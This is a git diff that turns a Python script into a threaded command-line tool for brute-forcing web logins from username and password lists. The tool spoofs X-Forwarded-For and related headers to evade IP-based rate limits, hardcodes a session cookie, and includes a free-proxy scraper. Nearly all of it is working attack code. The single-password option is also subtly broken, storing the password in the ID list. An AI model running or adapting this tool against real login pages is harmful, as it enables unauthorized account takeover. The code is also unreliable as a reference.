@@ -1,63 +1,39 @@
 import requests
 import threading
 from bs4 import BeautifulSoup                                                           
-from time import sleep
-import random
+import argparse
 
 headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml',
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml",
         "Cookie": "session=xAxPv4Zwe9rMb9wCLsbOqXI3CVvPzPu5",
         "Content-Type": "application/x-www-form-urlencoded",
         "X-Originating-IP": "127.0.0.1",
         "X-Forwarded-For": "127.0.0.1",
         "X-Remote-IP": "127.0.0.1",
         "X-Remote-Addr": "127.0.0.1",
-        }
-csrf= "FEsuGp2F4KHtrpNy4N7xZEFJisCcyXK9" 
-cuid = ""
-cpassw = ""
-def sendreq(url,passw,uid):
-    global cpassw
+    }
+
+def sendreq(url, passw, uid, isPresent, isAbsent):
     res = ""
     try:
-        #print(random.choice(iplist))
-        #print("Ruko Zara Sabar Karo")
         res=requests.post(url,data={
-            "csrf": csrf,
-            "username": uid,
-            "password": passw
-        }, headers=headers).text
+                          "username": uid,
+                          "password": passw
+                        },json={
+                          "username": uid,
+                          "password": passw
+                        }, headers=headers).text
     except Exception as e:
         print(e)
         res = ""
-    #print(res)
-    if res and "Invalid username or password." not in res and "<body>" in res:
+    if res and ((isPresent and isPresent in res) or (isAbsent and isAbsent not in res)):
         print("uid-",uid)
         print("pass-",passw)
-        print(res)
-        #cpassw = passw
-        #s_th = True
 
-def sendreqfindUID(url,passw,uid):
-    global cuid
-    print(uid)
-    res = ""
-    try:
-        res=requests.post(url,data={
-            "csrf": csrf,
-            "username": uid,
-            "password": passw
-        }, headers=headers).text
-    except Exception as e:
-        print(e)
-        res = ""
-    #print(res)
-    if res and cuid == "" and "Invalid username" not in res:
-        print("uid-",uid)
-        print(res)
-        cuid = uid
-        #s_th = True
+
+
+    
 
 def getIPs():
     response = requests.get("https://sslproxies.org/") 
@@ -69,49 +45,66 @@ def getIPs():
     print()
     return IPList
 
-def func(url,uids,passlist):
-    res= 0
-    i = 0
-    #print("finding uid and pass")
-    #for uid in uids:#5
-        #print(uid)
-    #    t = threading.Thread(target=sendreqfindUID, args=(url, "Test", uid))
-    #    t.start()
-    #print("Get Ps")
-    #for passw in passlist:         
-    #    i+=1
-        #print(passw)
-        #t = threading.Thread(target=sendreq, args=(url, passw, cuid))
-        #t.start()
-            #T.append(t)
-    for uid in uids:
+def bruteforce(url, idList, passList, isPresent, isAbsent):
+    for uid in idList:
         T =[]
-        for passw in passlist:
-            t = threading.Thread(target=sendreq, args=(url, passw, uid))
+        for passw in passList:
+            t = threading.Thread(target=sendreq, args=(url, passw, uid, isPresent, isAbsent))
             t.start()
             T.append(t)
         for t in T:
             t.join()
 
+def readFile(fileName):
+    with open(fileName, "r") as f:
+        items = f.readlines()
+        items = [item[:-1] for item in items]
+        return items
 
+def main():
+    parser = argparse.ArgumentParser(description='Process some integers.')
+    parser.add_argument('--url',
+                         action='store',
+                         required=True,
+                         help='bruteforce url')
+    passwords_group = parser.add_mutually_exclusive_group(required=True)
+    passwords_group.add_argument('--password', '-p',
+                                 action='store',
+                                 help='single password')
+    passwords_group.add_argument('--password-file', '-pf',
+                                 action='store',
+                                 help='path to passwords file')
+    ids_group = parser.add_mutually_exclusive_group(required=True)
+    ids_group.add_argument('--id', '-i',
+                           action='store',
+                           help='single id')
+    ids_group.add_argument('--id-file', '-if',
+                           action='store',
+                           help='path to ids file')
+    identifier_group = parser.add_mutually_exclusive_group(required=True)
+    identifier_group.add_argument('--is-present',
+                                 action='store',
+                                 help='if present in response terminates the bruteforce')
+    identifier_group.add_argument('--is-not-present',
+                                 action='store',
+                                 help='value if not present in response terminates the bruteforce')
+    options = parser.parse_args()
+    
+    url = options.url
+    passwords = []
+    ids = []
+    if options.password:
+        ids = [options.password]
+    else:
+        passwords = readFile(options.password_file)
+    
+    if options.id:
+        ids = [options.id]
+    else:
+        ids = readFile(options.id_file)
+    isPresent = options.is_present 
+    isNotPresent = options.is_not_present
+    bruteforce(url, ids, passwords, isPresent, isNotPresent)
 
-            
-
-
-url = ""
-
-with open("ID.txt", "r") as f:
-    uids = f.readlines()
-    uids = [uid[:-1] for uid in uids]
-    uids = uids[:-1]
-with open("pass.txt", "r") as f:
-    passlist = f.readlines()
-    passlist = [passw[:-1] for passw in passlist]
-    passlist = passlist[:-1]
-
-print("getting IPS")
-iplist = [1]#getIPs()
-print("IPs recieved")
-func(url,uids,passlist)
-#sendreq(url,"carlos","admin")
-
+if __name__=="__main__":
+    main()
